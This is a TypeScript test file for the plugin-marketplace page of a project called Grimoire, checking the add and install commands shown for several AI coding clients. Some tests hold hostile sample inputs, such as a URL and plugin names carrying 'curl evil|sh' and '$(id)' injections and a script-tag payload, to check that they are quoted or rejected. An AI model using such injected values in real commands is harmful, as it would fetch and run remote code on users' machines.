// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The Grimoire Authors

// The pure half of the `/marketplace/` landing page (C-030 / S-027): how the
// configured URL is shown, which add command each client carries, which
// plugins are listed and the header links per mode. The pages are checked
// against real builds in `marketplace_modes.test.ts`.
import { describe, expect, it } from "vitest";

import {
  marketplaceAdd,
  marketplaceHome,
  pluginInstall,
  pluginRecord,
} from "../../src/renderer/astro/lib/marketplace.js";
import { kindMark } from "../../src/renderer/astro/components/KindMark.tsx";
import { marketplaceAddChoices } from "../../src/renderer/astro/lib/commands.js";
import { navFor } from "../../src/renderer/astro/lib/nav.js";
import { listedPlugins } from "../../src/renderer/astro/lib/plugins.js";
import type { LocalMarketplace } from "../../src/marketplace/read.js";

describe("marketplaceAdd", () => {
  const all = ["claude", "copilot", "codex", "qoder", "cursor"] as const;
  const add = (client: (typeof all)[number], url: string) =>
    marketplaceAdd(client, { url, clients: [...all] }).command;
  const GITHUB = "https://github.com/acme/mk";
  const GITLAB = "https://gitlab.example.com/g/mk";

  // Mirrors the README grim writes (`client_section` in
  // src/export/marketplace_export.rs): one line per client, the repository whole.
  it.each([
    ["claude", `claude plugin marketplace add ${GITHUB}`],
    ["copilot", `copilot plugin marketplace add ${GITHUB}`],
    ["codex", `codex plugin marketplace add ${GITHUB}`],
    ["qoder", `qoder plugins marketplace add ${GITHUB}`],
    ["cursor", GITHUB],
  ] as const)("prints %s's add line for a GitHub repository exactly as grim's README does", (client, expected) => {
    expect(add(client, GITHUB)).toBe(expected);
  });

  it.each([
    ["claude", `claude plugin marketplace add ${GITLAB}`],
    ["copilot", `copilot plugin marketplace add ${GITLAB}`],
    ["codex", `codex plugin marketplace add ${GITLAB}`],
    // Qoder clones with git: every host but GitHub needs the `.git` suffix.
    ["qoder", `qoder plugins marketplace add ${GITLAB}.git`],
    ["cursor", GITLAB],
  ] as const)("prints %s's add line for a GitLab repository exactly as grim's README does", (client, expected) => {
    expect(add(client, GITLAB)).toBe(expected);
  });

  it("appends .git for Qoder unless the URL already ends in it, in any case", () => {
    expect(add("qoder", `${GITLAB}.git`)).toBe(`qoder plugins marketplace add ${GITLAB}.git`);
    expect(add("qoder", `${GITLAB}.GIT`)).toBe(`qoder plugins marketplace add ${GITLAB}.GIT`);
    // GitHub is the one host that resolves without it, on any port.
    expect(add("qoder", "https://github.com:8443/acme/mk")).toBe("qoder plugins marketplace add https://github.com:8443/acme/mk");
    expect(add("qoder", "https://github.com.evil.test/acme/mk")).toBe(
      "qoder plugins marketplace add https://github.com.evil.test/acme/mk.git",
    );
  });

  it("drops every trailing slash before Qoder's .git, and prints the others as grim does", () => {
    // `qoder_clone_url` trims all of them for a non-GitHub host; every other
    // client gets the value verbatim from the README builder.
    expect(add("qoder", `${GITLAB}//`)).toBe(`qoder plugins marketplace add ${GITLAB}.git`);
    expect(add("qoder", `${GITLAB}.Git/`)).toBe(`qoder plugins marketplace add ${GITLAB}.Git`);
    expect(add("qoder", `${GITHUB}/`)).toBe(`qoder plugins marketplace add ${GITHUB}/`);
    expect(add("claude", `${GITLAB}/`)).toBe(`claude plugin marketplace add ${GITLAB}/`);
    expect(add("cursor", `${GITLAB}//`)).toBe(`${GITLAB}//`);
  });

  it("returns text a template can escape, never markup of its own", () => {
    // Escaping happens at the Astro sink; the hostile value must come back whole.
    const hostile = "https://gitlab.com/<script>alert(1)</script>";
    expect(add("cursor", hostile)).toBe(hostile);
  });

  it("keeps a .git remote whole in every command", () => {
    expect(add("claude", "https://github.com/acme/mk.git")).toBe(
      "claude plugin marketplace add https://github.com/acme/mk.git",
    );
  });

  it("single-quotes a repository the shell would read as more than one word", () => {
    const url = "https://x.test/repo;curl${IFS}evil|sh&a=1";
    expect(add("claude", url)).toBe(`claude plugin marketplace add '${url}'`);
    expect(add("qoder", url)).toBe(`qoder plugins marketplace add '${url}.git'`);
    // A quote in the value closes and reopens the quoting, never ends it.
    expect(add("codex", "https://x.test/it's")).toBe("codex plugin marketplace add 'https://x.test/it'\\''s'");
  });

  it("copies the GUI client's URL bare: it is pasted into a dialog, not a shell", () => {
    expect(add("cursor", "https://x.test/a b;c")).toBe("https://x.test/a b;c");
  });
});

describe("pluginInstall", () => {
  const install = (client: Parameters<typeof pluginInstall>[0], plugin = "dev", name = "acme-plugins") =>
    pluginInstall(client, plugin, name)?.command;

  // Mirrors the README's install lines with `<plugin>` filled in.
  it("prints each client's install line as grim's README does", () => {
    expect(install("claude")).toBe("claude plugin install dev@acme-plugins");
    expect(install("copilot")).toBe("copilot plugin install dev@acme-plugins");
    expect(install("codex")).toBe("codex plugin add dev@acme-plugins");
    expect(install("qoder")).toBe("qoder plugins install dev");
  });

  it("has no shell command for the GUI client", () => {
    expect(install("cursor")).toBeUndefined();
  });

  it.each([
    ["a plugin name", "dev; curl evil|sh", "acme-plugins"],
    ["a marketplace name", "dev", "x; curl evil|sh"],
    ["a name with a substitution", "$(id)", "acme"],
    ["an empty name", "", "acme"],
    ["a name starting with a dash", "-rf", "acme"],
  ])("refuses to print a command around %s", (_label, plugin, name) => {
    for (const client of ["claude", "copilot", "codex", "qoder"] as const) {
      expect(pluginInstall(client, plugin, name)).toBeNull();
    }
  });
});

describe("marketplaceAddChoices", () => {
  it("offers one choice per listed client, in the listed order", () => {
    const choices = marketplaceAddChoices({
      url: "https://github.com/acme/mk",
      clients: ["codex", "cursor", "claude"],
    });
    expect(choices.map((c) => c.name)).toEqual(["ChatGPT / Codex", "Cursor", "Claude Code"]);
    expect(choices.map((c) => c.command)).toEqual([
      "codex plugin marketplace add https://github.com/acme/mk",
      "https://github.com/acme/mk",
      "claude plugin marketplace add https://github.com/acme/mk",
    ]);
    expect(choices.every((c) => c.path)).toBe(true);
  });

  it("gives each harness its own brand glyph", () => {
    const paths = new Map(
      marketplaceAddChoices({
        url: "https://github.com/acme/mk",
        clients: ["claude", "copilot", "codex", "cursor", "qoder"],
      }).map((c) => [c.name, c.path]),
    );
    expect(new Set([...paths.values()]).size).toBe(paths.size);
    // Clawd is rect-based pixel art, not the Claude starburst curve.
    expect(paths.get("Claude Code")).toMatch(/^M4 5h16v3H4z/);
  });
});

describe("pluginRecord", () => {
  it("shows a version without its build metadata, as grim's README does", () => {
    const record = (version?: string) =>
      pluginRecord("acme-plugins", { name: "dev", description: "Dev", members: [], ...(version && { version }) });
    expect(record("0.0.0+0a1b2c3d4e5f").version).toBe("0.0.0");
    expect(record("1.2.3").version).toBe("1.2.3");
    expect(record("1.2.3-rc.1+build.5").version).toBe("1.2.3-rc.1");
    expect(record().version).toBeUndefined();
  });
});

describe("marketplaceHome", () => {
  it("is the /marketplace/ page only in both mode; elsewhere the site root", () => {
    expect(marketplaceHome("both")).toBe("/marketplace/");
    expect(marketplaceHome("marketplace")).toBe("/");
    expect(marketplaceHome("packages")).toBe("/");
  });
});

describe("navFor", () => {
  const DOCS = "https://docs.example.test";
  const REPO = "https://gitlab.com/acme/index";
  const docsRepo = [
    { label: "docs", href: DOCS },
    { label: "gitlab", href: REPO },
  ];

  it("lets an explicit nav win in every mode, an empty one included", () => {
    const explicit = [{ label: "Setup", href: "/setup/" }];
    for (const mode of ["packages", "both", "marketplace"] as const) {
      expect(navFor(explicit, DOCS, REPO, mode)).toEqual(explicit);
      expect(navFor([], DOCS, REPO, mode)).toEqual([]);
    }
  });

  it("puts packages and marketplace tabs ahead of docs and the forge in both mode only", () => {
    expect(navFor(null, DOCS, REPO, "both")).toEqual([
      { label: "packages", href: "/" },
      { label: "marketplace", href: "/marketplace/" },
      ...docsRepo,
    ]);
    expect(navFor(null, DOCS, REPO, "packages")).toEqual(docsRepo);
    expect(navFor(null, DOCS, REPO, "marketplace")).toEqual(docsRepo);
  });

  it("keeps every synthesized label lower case, an unknown forge named by host", () => {
    const labels = navFor(null, DOCS, "https://Git.Acme.test/x", "both").map((l) => l.label);
    expect(labels).toEqual(["packages", "marketplace", "docs", "git.acme.test"]);
    expect(labels.every((l) => l === l.toLowerCase())).toBe(true);
  });

  it("drops the docs and forge links that are not configured", () => {
    expect(navFor(null, null, null, "packages")).toEqual([]);
    expect(navFor(null, null, null, "both")).toHaveLength(2);
  });
});

describe("listedPlugins", () => {
  const member = { kind: "skill", name: "hex", ref: "ghcr.io/acme/hex", href: "/p/acme/hex/" };
  const marketplace = (clients: LocalMarketplace["clients"]): LocalMarketplace => ({
    name: "acme-plugins",
    repository: null,
    clients,
    plugins: [
      { name: "dev", description: "Dev", members: [member] },
      { name: "bare", description: "Bare", members: [] },
    ],
    docs: {},
    logos: {},
  });

  it("is empty without a marketplace", () => {
    expect(listedPlugins({ marketplace: null })).toEqual([]);
  });

  it("carries each plugin's members, linked ones with their href", () => {
    const listed = listedPlugins({ marketplace: marketplace(["claude"]) });
    expect(listed.map((p) => p.name)).toEqual(["dev", "bare"]);
    expect(listed[0]!.members).toEqual([member]);
    expect(listed[1]!.members).toEqual([]);
  });

  it("lists nothing when the only clients have no shell command", () => {
    expect(listedPlugins({ marketplace: marketplace(["cursor"]) })).toEqual([]);
  });
});

describe("kindMark", () => {
  it("has a mark for every indexed kind, bundle and plugin included", () => {
    for (const kind of ["skill", "rule", "agent", "mcp", "bundle", "hook", "plugin"]) {
      expect(kindMark(kind), kind).toBeDefined();
    }
  });

  it("has none for a kind that is not its own key", () => {
    for (const kind of ["constructor", "__proto__", "toString", "hasOwnProperty", "valueOf", "unknown", ""]) {
      expect(kindMark(kind), kind).toBeUndefined();
    }
  });
});
